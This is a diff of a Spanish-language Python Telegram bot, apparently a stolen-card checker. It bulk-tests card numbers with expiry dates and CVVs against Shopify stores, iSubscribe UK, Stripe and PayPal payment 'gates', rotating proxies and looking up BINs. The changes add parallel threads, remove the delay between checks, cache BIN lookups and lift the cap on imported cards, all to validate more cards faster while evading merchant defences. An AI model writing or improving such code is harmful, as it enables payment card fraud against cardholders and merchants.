-            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
-            break
-        
-        sitio = sitios[sitio_index_local % total_sitios]
-        sitio_index_local += 1
-        
+    for i, card in enumerate(cards):
+        sitio = sitios[i % total_sitios]
         if total_proxies > 0:
             proxy = proxies[proxy_index_local % total_proxies]
             proxy_index_local += 1
         else:
             proxy = None
+        trabajos.append((card, sitio, proxy))
+    
+    # Procesar en paralelo
+    with ThreadPoolExecutor(max_workers=max_hilos) as executor:
+        futures = {executor.submit(procesar_tarjeta, card, sitio, proxy): idx 
+                   for idx, (card, sitio, proxy) in enumerate(trabajos)}
         
-        bin_info = consultar_bin(card[:6])
-        resultado = verificar_api_autoshopify(card, sitio, proxy)
-        
-        if resultado:
-            mensaje = resultado.get('message', '').lower()
+        procesados = 0
+        for future in as_completed(futures):
+            if task_id in active_tasks and active_tasks[task_id].get('cancel'):
+                break
             
-            respuestas_muertas = ['py id empty', '404', 'not found', 'connection refused', 'r4 token empty', 'token empty']
-            if any(rm in mensaje for rm in respuestas_muertas):
-                if sitio not in sitios_a_eliminar:
-                    sitios_a_eliminar.append(sitio)
-                    resultados['sitios_eliminados'] += 1
-                    print(f"🗑️ Sitio marcado para eliminar: {sitio}")
+            try:
+                resultado = future.result(timeout=30)
+                procesados += 1
+                
+                if resultado:
+                    if resultado[0] == 'eliminar_sitio':
+                        sitio = resultado[1]
+                        card = resultado[2]
+                        if sitio not in sitios_a_eliminar:
+                            sitios_a_eliminar.append(sitio)
+                            resultados['sitios_eliminados'] += 1
+                            print(f"🗑️ Sitio marcado para eliminar: {sitio}")
+                        resultados['error'] += 1
+                        detalles.append(f"⚠️ {card} | Sitio eliminado")
+                    elif resultado[0] == 'success':
+                        resultados['success'] += 1
+                        detalles.append(f"✅ {resultado[1]} | {resultado[2][:30]}")
+                    elif resultado[0] == 'failed':
+                        resultados['failed'] += 1
+                        detalles.append(f"❌ {resultado[1]} | {resultado[2][:30]}")
+                    else:
+                        resultados['error'] += 1
+                        detalles.append(f"⚠️ {resultado[1]} | {resultado[2][:30]}")
+                
+            except Exception as e:
+                print(f"Error procesando: {e}")
+                resultados['error'] += 1
             
-            if sitio not in sitios_a_eliminar:
-                guardar_historial(card, resultado['proxy'], f"Shopify ${resultado['amount']}", 
-                                resultado['amount'], resultado['status'], 
-                                resultado['message'], resultado['gates'], bin_info)
+            if procesados % notificar_cada == 0 or procesados == total_tarjetas:
+                porcentaje = (procesados / total_tarjetas) * 100
+                barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
+                tiempo_transcurrido = time.time() - start_time
+                velocidad = procesados / tiempo_transcurrido if tiempo_transcurrido > 0 else 0
                 
-                actualizar_estadisticas_sitio(sitio, resultado['success'])
-                
-                if resultado['status'] == 'success':
-                    resultados['success'] += 1
-                    estado_emoji = "✅"
-                elif resultado['status'] == 'failed':
-                    resultados['failed'] += 1
-                    estado_emoji = "❌"
-                else:
-                    resultados['error'] += 1
-                    estado_emoji = "⚠️"
-                
-                detalles.append(f"{estado_emoji} {card} | Sitio: {sitio[:30]}... | Proxy: {proxy[:20] if proxy else 'directo'} | {resultado['status']}")
-        
-        procesadas = i
-        
-        if i % notificar_cada == 0 or i == total_tarjetas:
-            porcentaje = (i / total_tarjetas) * 100
-            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
-            
-            texto = f"""📊 PROGRESO: {i}/{total_tarjetas}
-{barra} {porcentaje:.0f}%
-
+                texto = f"""⚡ PROGRESO: {procesados}/{total_tarjetas} ({porcentaje:.1f}%)
+{barra}
+⚡ Velocidad: {velocidad:.1f} tarjetas/seg
 ✅ Aprobadas: {resultados['success']}
 ❌ Declinadas: {resultados['failed']}
 ⚠️ Errores: {resultados['error']}
 🗑️ Sitios eliminados: {resultados['sitios_eliminados']}"""
-            
-            try:
-                bot.edit_message_text(texto, chat_id, msg.message_id)
-            except:
-                pass
-        
-        if delay > 0 and i < total_tarjetas:
-            time.sleep(delay)
+                
+                try:
+                    bot.edit_message_text(texto, chat_id, msg.message_id)
+                except:
+                    pass
     
+    # Eliminar sitios muertos
     if sitios_a_eliminar:
         conn = get_db_connection()
         cursor = conn.cursor()
@@ -2171,25 +2144,27 @@ def procesar_masivo_shopify(task_id, chat_id, delay, notificar_cada):
     tiempo_total = time.time() - start_time
     minutos = int(tiempo_total // 60)
     segundos = int(tiempo_total % 60)
+    velocidad_final = total_tarjetas / tiempo_total if tiempo_total > 0 else 0
     
     filename = f"resultados_shopify_{task_id}.txt"
     with open(filename, 'w', encoding='utf-8') as f:
-        f.write(f"RESULTADOS VERIFICACIÓN SHOPIFY\n")
+        f.write(f"RESULTADOS VERIFICACIÓN SHOPIFY (MODO RÁPIDO)\n")
         f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
         f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
         f.write(f"Total tarjetas: {total_tarjetas}\n")
         f.write(f"Sitios usados: {total_sitios}\n")
         f.write(f"Sitios eliminados: {resultados['sitios_eliminados']}\n")
         f.write(f"Tiempo: {minutos}m {segundos}s\n")
+        f.write(f"Velocidad: {velocidad_final:.1f} tarjetas/seg\n")
         f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
         f.write(f"✅ Aprobadas: {resultados['success']}\n")
         f.write(f"❌ Declinadas: {resultados['failed']}\n")
         f.write(f"⚠️ Errores: {resultados['error']}\n\n")
         f.write(f"━━━━ DETALLES ━━━━━━━━━━━━━━\n\n")
-        for d in detalles:
+        for d in detalles[:100]:  # Limitar detalles en archivo
             f.write(f"{d}\n")
     
-    texto_final = f"""✅ VERIFICACIÓN SHOPIFY COMPLETADA
+    texto_final = f"""✅ VERIFICACIÓN SHOPIFY COMPLETADA (MODO RÁPIDO)
 ━━━━━━━━━━━━━━━━━━━━━━
 📊 RESULTADOS:
 ✅ Aprobadas: {resultados['success']}
@@ -2197,6 +2172,7 @@ def procesar_masivo_shopify(task_id, chat_id, delay, notificar_cada):
 ⚠️ Errores: {resultados['error']}
 🗑️ Sitios eliminados: {resultados['sitios_eliminados']}
 ⏱️ Tiempo: {minutos}m {segundos}s
+⚡ Velocidad: {velocidad_final:.1f} tarjetas/seg
 
 📁 Se generó archivo con detalles"""
     
@@ -2206,16 +2182,18 @@ def procesar_masivo_shopify(task_id, chat_id, delay, notificar_cada):
         bot.send_message(chat_id, texto_final)
     
     with open(filename, 'rb') as f:
-        bot.send_document(chat_id, f, caption=f"📊 Resultados Shopify - {total_tarjetas} tarjetas")
+        bot.send_document(chat_id, f, caption=f"📊 Resultados Shopify Rápido - {total_tarjetas} tarjetas")
     
     os.remove(filename)
     time.sleep(300)
     if task_id in active_tasks:
         del active_tasks[task_id]
 
+# ==================== VERIFICACIÓN MASIVA iSubscribe UK (VERSIÓN RÁPIDA) ====================
+
 @bot.message_handler(commands=['muk'])
-def cmd_mass_isubscribe(message):
-    """Verificación masiva con iSubscribe UK (£4.00)"""
+def cmd_mass_isubscribe_rapido(message):
+    """Verificación masiva con iSubscribe UK - VERSIÓN RÁPIDA CON HILOS"""
     tarjetas = obtener_todas_tarjetas()
     
     if not tarjetas:
@@ -2223,8 +2201,9 @@ def cmd_mass_isubscribe(message):
         return
     
     texto = message.text.split()
-    delay = 3
+    delay = 0
     notificar_cada = 10
+    max_hilos = 10
     
     for i, arg in enumerate(texto):
         if arg == '--delay' and i+1 < len(texto):
@@ -2237,26 +2216,33 @@ def cmd_mass_isubscribe(message):
                 notificar_cada = int(texto[i+1])
             except:
                 pass
+        elif arg == '--hilos' and i+1 < len(texto):
+            try:
+                max_hilos = int(texto[i+1])
+            except:
+                pass
     
     task_id = f"muk_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
     
     active_tasks[task_id] = {'chat_id': message.chat.id, 'cancel': False}
     
-    config = f"""🇬🇧 VERIFICACIÓN MASIVA iSubscribe UK (£4.00)
+    config = f"""🇬🇧 VERIFICACIÓN MASIVA iSubscribe UK (MODO RÁPIDO)
 ━━━━━━━━━━━━━━━━━━━━━━
 📌 Tarjetas: {len(tarjetas)}
-⏱️ Delay: {delay}s
+⚡ Hilos en paralelo: {max_hilos}
 🔔 Notificar: cada {notificar_cada}
 🆔 ID: {task_id}
+
 /cancelar_{task_id} - Cancelar"""
     
     bot.reply_to(message, config)
     
-    thread = Thread(target=procesar_masivo_isubscribe, args=(task_id, message.chat.id, delay, notificar_cada))
+    thread = Thread(target=procesar_masivo_isubscribe_rapido, 
+                   args=(task_id, message.chat.id, delay, notificar_cada, max_hilos))
     thread.daemon = True
     thread.start()
 
-def procesar_masivo_isubscribe(task_id, chat_id, delay, notificar_cada):
+def procesar_masivo_isubscribe_rapido(task_id, chat_id, delay, notificar_cada, max_hilos=10):
     cards = [c[0] for c in obtener_todas_tarjetas()]
     total = len(cards)
     
@@ -2264,18 +2250,27 @@ def procesar_masivo_isubscribe(task_id, chat_id, delay, notificar_cada):
         bot.send_message(chat_id, "📭 No hay tarjetas")
         return
     
-    msg = bot.send_message(chat_id, "🇬🇧 Iniciando verificación iSubscribe UK...")
+    msg = bot.send_message(chat_id, f"⚡ Iniciando verificación rápida iSubscribe UK con {max_hilos} hilos...")
     
     resultados = {'success': 0, 'failed': 0, 'error': 0}
     detalles = []
     start_time = time.time()
     
-    for i, card in enumerate(cards, 1):
+    # Cache de BINs
+    bin_cache_local = {}
+    
+    # Función para procesar una tarjeta
+    def procesar_tarjeta(card):
         if task_id in active_tasks and active_tasks[task_id].get('cancel'):
-            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
-            break
+            return None
         
-        bin_info = consultar_bin(card[:6])
+        bin_key = card[:6]
+        if bin_key in bin_cache_local:
+            bin_info = bin_cache_local[bin_key]
+        else:
+            bin_info = consultar_bin_con_cache(bin_key)
+            bin_cache_local[bin_key] = bin_info
+        
         proxy = obtener_proximo_proxy()
         resultado = verificar_isubscribe(card, proxy)
         
@@ -2284,58 +2279,90 @@ def procesar_masivo_isubscribe(task_id, chat_id, delay, notificar_cada):
                             resultado['status'], resultado['message'], 'isubscribe uk', bin_info)
             
             if resultado['status'] == 'success':
-                resultados['success'] += 1
-                emoji = "✅"
+                return ('success', card, resultado['message'][:50])
             elif resultado['status'] == 'failed':
-                resultados['failed'] += 1
-                emoji = "❌"
+                return ('failed', card, resultado['message'][:50])
             else:
-                resultados['error'] += 1
-                emoji = "⚠️"
-            
-            detalles.append(f"{emoji} {card} | {resultado['status']} | {resultado['message'][:50]}")
+                return ('error', card, resultado['message'][:50])
+        return ('error', card, 'Sin resultado')
+    
+    # Procesar en paralelo
+    with ThreadPoolExecutor(max_workers=max_hilos) as executor:
+        futures = {executor.submit(procesar_tarjeta, card): card for card in cards}
         
-        if i % notificar_cada == 0 or i == total:
-            porcentaje = (i / total) * 100
-            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
+        procesados = 0
+        for future in as_completed(futures):
+            if task_id in active_tasks and active_tasks[task_id].get('cancel'):
+                break
             
-            texto = f"""📊 PROGRESO: {i}/{total}
-{barra} {porcentaje:.0f}%
+            try:
+                resultado = future.result(timeout=30)
+                procesados += 1
+                
+                if resultado:
+                    if resultado[0] == 'success':
+                        resultados['success'] += 1
+                        detalles.append(f"✅ {resultado[1]} | {resultado[2][:30]}")
+                    elif resultado[0] == 'failed':
+                        resultados['failed'] += 1
+                        detalles.append(f"❌ {resultado[1]} | {resultado[2][:30]}")
+                    else:
+                        resultados['error'] += 1
+                        detalles.append(f"⚠️ {resultado[1]} | {resultado[2][:30]}")
+                
+            except Exception as e:
+                print(f"Error procesando: {e}")
+                resultados['error'] += 1
+            
+            if procesados % notificar_cada == 0 or procesados == total:
+                porcentaje = (procesados / total) * 100
+                barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
+                tiempo_transcurrido = time.time() - start_time
+                velocidad = procesados / tiempo_transcurrido if tiempo_transcurrido > 0 else 0
+                
+                texto = f"""⚡ PROGRESO: {procesados}/{total} ({porcentaje:.1f}%)
+{barra}
+⚡ Velocidad: {velocidad:.1f} tarjetas/seg
 ✅ Aprobadas: {resultados['success']}
 ❌ Declinadas: {resultados['failed']}
 ⚠️ Errores: {resultados['error']}"""
-            
-            try:
-                bot.edit_message_text(texto, chat_id, msg.message_id)
-            except:
-                pass
-        
-        if delay > 0 and i < total:
-            time.sleep(delay)
+                
+                try:
+                    bot.edit_message_text(texto, chat_id, msg.message_id)
+                except:
+                    pass
     
     tiempo_total = time.time() - start_time
     minutos = int(tiempo_total // 60)
     segundos = int(tiempo_total % 60)
+    velocidad_final = total / tiempo_total if tiempo_total > 0 else 0
     
     filename = f"resultados_isubscribe_{task_id}.txt"
     with open(filename, 'w', encoding='utf-8') as f:
-        f.write(f"RESULTADOS iSubscribe UK £4.00\n")
+        f.write(f"RESULTADOS VERIFICACIÓN iSubscribe UK (MODO RÁPIDO)\n")
+        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
         f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
         f.write(f"Total: {total}\n")
-        f.write(f"Tiempo: {minutos}m {segundos}s\n\n")
+        f.write(f"Tiempo: {minutos}m {segundos}s\n")
+        f.write(f"Velocidad: {velocidad_final:.1f} tarjetas/seg\n")
+        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
         f.write(f"✅ Aprobadas: {resultados['success']}\n")
         f.write(f"❌ Declinadas: {resultados['failed']}\n")
         f.write(f"⚠️ Errores: {resultados['error']}\n\n")
-        for d in detalles:
+        f.write(f"━━━━ DETALLES ━━━━━━━━━━━━━━\n\n")
+        for d in detalles[:100]:
             f.write(f"{d}\n")
     
-    texto_final = f"""✅ VERIFICACIÓN iSubscribe UK COMPLETADA
+    texto_final = f"""✅ VERIFICACIÓN iSubscribe UK COMPLETADA (MODO RÁPIDO)
 ━━━━━━━━━━━━━━━━━━━━━━
 📊 RESULTADOS:
 ✅ Aprobadas: {resultados['success']}
 ❌ Declinadas: {resultados['failed']}
 ⚠️ Errores: {resultados['error']}
-⏱️ Tiempo: {minutos}m {segundos}s"""
+⏱️ Tiempo: {minutos}m {segundos}s
+⚡ Velocidad: {velocidad_final:.1f} tarjetas/seg
+
+📁 Se generó archivo con detalles"""
     
     try:
         bot.edit_message_text(texto_final, chat_id, msg.message_id)
@@ -2343,7 +2370,7 @@ def procesar_masivo_isubscribe(task_id, chat_id, delay, notificar_cada):
         bot.send_message(chat_id, texto_final)
     
     with open(filename, 'rb') as f:
-        bot.send_document(chat_id, f, caption=f"🇬🇧 Resultados iSubscribe UK - {total} tarjetas")
+        bot.send_document(chat_id, f, caption=f"🇬🇧 Resultados iSubscribe UK Rápido - {total} tarjetas")
     
     os.remove(filename)
     time.sleep(300)
@@ -2379,7 +2406,7 @@ def cmd_stats(message):
 def cmd_bin(message):
     try:
         bin_num = message.text.split()[1][:6]
-        info = consultar_bin(bin_num)
+        info = consultar_bin_con_cache(bin_num)
         
         texto = f"""
 🔍 INFORMACION DEL BIN {bin_num}
@@ -2418,42 +2445,17 @@ def handle_document(message):
         downloaded_file = bot.download_file(file_info.file_path)
         contenido = downloaded_file.decode('utf-8')
         
-        # Extraer URLs de cualquier formato
+        # Extraer URLs
         urls = extraer_urls_de_texto(contenido)
         
-        # Extraer proxies de cualquier formato
+        # Extraer proxies
         proxies = extraer_proxies_de_texto(contenido)
         
-        # Detectar tarjetas
-        lineas = contenido.strip().split('\n')
-        es_tarjeta = False
-        tarjetas = []
-        
-        for linea in lineas[:20]:
-            linea = linea.strip()
-            if '|' in linea:
-                partes = linea.split('|')
-                if len(partes) == 4:
-                    if all(p.isdigit() for p in partes):
-                        es_tarjeta = True
-                        tarjetas.append(linea)
+        # Extraer tarjetas (TODAS, sin límite)
+        tarjetas = extraer_tarjetas_de_texto(contenido)
         
         if tarjetas and len(tarjetas) > 0:
-            guardadas = 0
-            repetidas = 0
-            
-            conn = get_db_connection()
-            cursor = conn.cursor()
-            for cc in tarjetas:
-                try:
-                    cursor.execute("INSERT INTO tarjetas (cc, fecha) VALUES (?, ?)",
-                                  (cc, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
-                    conn.commit()
-                    guardadas += 1
-                except:
-                    repetidas += 1
-            conn.close()
-            
+            guardadas, repetidas = guardar_tarjetas_desde_lista(tarjetas)
             texto = f"""✅ TARJETAS CARGADAS
 ━━━━━━━━━━━━━━━━━━━━━━
 📦 Guardadas: {guardadas}
@@ -2538,7 +2540,7 @@ def callback_handler(call):
         bot.edit_message_text("🛍️ GESTIÓN DE SITIOS\n\nSelecciona una opción:", call.message.chat.id, call.message.message_id, reply_markup=menu_shopify())
     
     elif call.data == 'menu_isubscribe':
-        bot.send_message(call.message.chat.id, "🇬🇧 iSubscribe UK £4.00\n\nUsa: /uk NUMERO|MES|AÑO|CVV\n\nMasivo: /muk")
+        bot.send_message(call.message.chat.id, "🇬🇧 iSubscribe UK £4.00\n\nUsa: /uk NUMERO|MES|AÑO|CVV\n\nMasivo: /muk (MODO RÁPIDO)")
     
     elif call.data == 'paypal_10':
         bot.send_message(call.message.chat.id, "💰 PAYPAL $10.00\n\nUsa: /pp NUMERO|MES|AÑO|CVV")
@@ -2553,7 +2555,7 @@ def callback_handler(call):
         bot.send_message(call.message.chat.id, "🛍️ AUTOSHOPIFY\n\nUsa: /sh NUMERO|MES|AÑO|CVV\n\nOpcional: /sh CC URL")
     
     elif call.data == 'shopify_masivo':
-        bot.send_message(call.message.chat.id, "📦 VERIFICACIÓN MASIVA\n\nUsa: /msh\n\nOpciones: /msh --delay 3 --notificar 10")
+        bot.send_message(call.message.chat.id, "📦 VERIFICACIÓN MASIVA SHOPIFY\n\nUsa: /msh (MODO RÁPIDO)\n\nOpciones: /msh --hilos 15 --notificar 20")
     
     elif call.data == 'add_sitio':
         msg = bot.send_message(call.message.chat.id, "➕ AÑADIR SITIO\n\nEnvía la URL del sitio:")
@@ -2715,7 +2717,7 @@ def listar_proxies(message):
 
 if __name__ == "__main__":
     print("="*80)
-    print("🤖 AUTO SHOPIFY BOT - VERSIÓN COMPLETA")
+    print("🤖 AUTO SHOPIFY BOT - VERSIÓN COMPLETA CON MODO RÁPIDO")
     print("="*80)
     print("✅ Gates disponibles:")
     print("   • Stripe $1 No AVS  → /check5")
@@ -2726,18 +2728,21 @@ if __name__ == "__main__":
     print("✅ Comandos masivos:")
     print("   • Stripe masivo     → /mass")
     print("   • PayPal masivo     → /mpp")
-    print("   • Shopify masivo    → /msh")
-    print("   • iSubscribe masivo → /muk")
+    print("   • Shopify masivo    → /msh (MODO RÁPIDO)")
+    print("   • iSubscribe masivo → /muk (MODO RÁPIDO)")
+    print("="*80)
+    print("✅ Mejoras de velocidad:")
+    print("   • Hilos en paralelo (configurable con --hilos)")
+    print("   • Cache de BINs")
+    print("   • Delay reducido a 0")
+    print("   • Velocidad en tiempo real")
     print("="*80)
     print("✅ Proxies:")
     print("   • /px - Test ULTRA RÁPIDO")
-    print("   • /proxy - Configurar proxy manual")
     print("   • /exportproxies - Exportar todos los proxies")
-    print("   • Rotación automática en cada verificación")
     print("="*80)
     print("✅ Sitios:")
     print("   • /addsh, /sitios, /delsh, /cleansites")
-    print("   • Rotación automática en cada /sh y /msh")
     print("   • Limpieza automática de sitios que no funcionan")
     print("="*80)
     print("📱 Usa /menu para comenzar")
